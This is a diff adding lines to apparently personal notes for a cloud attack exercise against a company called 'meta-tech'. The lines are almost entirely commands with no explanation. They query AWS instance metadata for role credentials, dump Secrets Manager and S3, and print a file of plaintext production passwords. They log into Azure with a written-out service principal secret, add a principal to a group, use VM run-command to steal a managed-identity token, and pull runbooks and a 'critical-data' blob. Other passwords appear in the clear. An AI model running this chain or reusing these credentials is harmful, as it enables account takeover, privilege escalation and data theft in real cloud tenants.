@@ -42,7 +42,7 @@ Login to gcp cli
 
 gcloud login with access-token ```gcloud projects list --access-token-file accesstoken.txt```
 
-## All commands
+# All commands
 
 gcloud auth activate-service-account --key-file ./sonic-airfoil-339910-8c4c6de6bf0d.json 
 
@@ -149,3 +149,138 @@ sudo ssh -L 127.0.0.1:80:10.20.1.220:80 -i ./ssh-jump-host.pem ec2-user@18.118.1
 
 gns, Password@123 - gitlab password
 
+sudo ssh -L 127.0.0.1:8080:10.20.1.252:8080 -i ssh-jump-host.pem ec2-user@18.118.189.176 - port forward for jenkens
+
+ssh -i aws_prod_ssh.pem ec2-user@10.20.2.20
+
+metadata
+- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-data-access-role
+
+export AWS_ACCESS_KEY_ID='your_access_key_id_here'
+export AWS_SECRET_ACCESS_KEY='your_secret_access_key_here'
+export AWS_SESSION_TOKEN='your_session_token_here'
+
+aws secretsmanager list-secrets --profile prod-srv --region us-east-2
+
+aws secretsmanager get-secret-value --secret-id database-admin-credential --profile prod-srv --region us-east-2
+
+aws s3api list-buckets --region us-east-2
+
+aws s3api list-objects --bucket meta-tech-bucket20230929140406617200000001 --region us-east-2
+
+aws s3api get-object --bucket meta-tech-bucket20230929140406617200000001 --key Modules/AWS/sensitive-private.txt aws-private.txt
+
+[ content of aws-private.txt 
+Production User's Credentials:
+Username : kevin.ade
+Password: DFerj@344fdj
+Role : Devops Admin
+
+Username : lim.las
+Password: Hyd5444&3j
+Role : Cloud Admin
+
+Username : srv_acc
+Password: 88D4hdhdh%34
+Role : On-Premise Admin
+]
+
+aws rds describe-db-instances --region us-east-2
+
+aws ec2 describe-security-groups --group-ids sg-0ee9fbf3806a20723 --region us-east-2
+
+ssh -L 127.0.0.1:3306:prod-database.cdemh5kczfej.us-east-2.rds.amazonaws.com:3306 -i aws-prod-ssh-key.pem ec2-user@10.20.2.20
+
+[db commands mysql -h 127.0.0.1 -u database_admin -p
+.
+.
+.]
+
+-- AZURE --
+https://login.windows.net/meta-tech.cloud/.well-known/openid-configuration
+
+az login --service-principal --username bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58 --password tDZ8Q~XXd3zd9Z1mtjsgHG-4gGQq6i6A~idr2bdR --tenant 68b40a4c-50f1-48f3-b7cb-916dd82418a7
+
+az ad sp list --filter "AppId eq 'bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58'"
+
+az account get-access-token --resource https://graph.microsoft.com
+
+Connect-MgGraph -AccessToken "MSGraphAccessToken"
+
+Get-MgGroup
+
+curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/owners
+
+curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/members
+
+Get-MgServicePrincipal -filter "AppId eq 'bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58'"
+
+New-MgGroupMember -GroupId '21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0' -DirectoryObjectId 'd36c9074-71a3-4dcf-928f-b445eeb6f6ca'
+
+curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/members
+
+az account list
+
+az role assignment list --subscription 484f280d-a210-4272-b85d-cdd1a66572ed --all
+
+az role definition list --name "view-only-role"
+
+az keyvault list
+
+az keyvault secret list --vault-name meta-tech-dev-vault
+
+az keyvault secret show --id https://meta-tech-dev-vault.vault.azure.net/secrets/Dev-VM-Key
+
+az vm list
+
+az vm list-ip-addresses -g Engineering-RG -n eng-dev-vm
+
+ssh -i Dev-VM-Key devuser@40.88.44.0
+
+az login --identity
+
+az role assignment list --subscription 484f280d-a210-4272-b85d-cdd1a66572ed --assignee b9134241-ac54-4983-8298-2d2296bbc1b0 --all
+
+az role assignment list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 --assignee b9134241-ac54-4983-8298-2d2296bbc1b0 --all
+
+az role definition list --name vm-runcommand
+
+az vm list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4
+
+az vm run-command invoke -g IT-RG -n it-gts-vm --command-id RunShellScript --scripts "hostname"
+
+az vm run-command invoke -g IT-RG -n it-gts-vm --command-id RunShellScript --scripts 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
+
+az role assignment list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 --assignee 9eda75b7-d285-4772-89ee-1df89717317 --all
+
+az automation account list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4
+
+Connect-AzAccount -AccountId $SubscriptionID -AccessToken $AccessToken
+
+Get-AzAutomationRunbook -ResourceGroupName IT-RG -AutomationAccountName GTS-Automation
+
+Export-AzAutomationRunbook -ResourceGroupName "IT-RG" -AutomationAccountName "GTS-Automation" -Name "Test-Automation" -Slot "Published" -OutputFolder "." -Verbose
+
+Export-AzAutomationRunbook -ResourceGroupName "IT-RG" -AutomationAccountName "GTS-Automation" -Name "Prod-Automation" -Slot "Published" -OutputFolder "." -Verbose
+
+az vm list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 -o table
+
+az network public-ip list -g IT-RG --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 -o table
+
+az network nsg list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4
+
+ssh -L 3389:10.30.2.132:3389 -i Dev-VM-Key devuser@40.88.44.0
+
+rdp : azureuser@MetaTech1234:127.0.0.1:3389
+
+Get-AzStorageAccount
+
+$storageAccount = Get-AzStorageAccount -Name "metatechdevsa" -ResourceGroupName "IT-RG"
+$storageAccount.Context
+
+Get-AzStorageContainer -Context $storageAccount.Context | ConvertTo-Json
+
+Get-AzStorageBlob -Container metatech-dev-container -Context $storageAccount.Context
+
+Get-AzStorageBlobContent -Container metatech-dev-container -Context $storageAccount.Context -Blob metatech-critical-data.txt
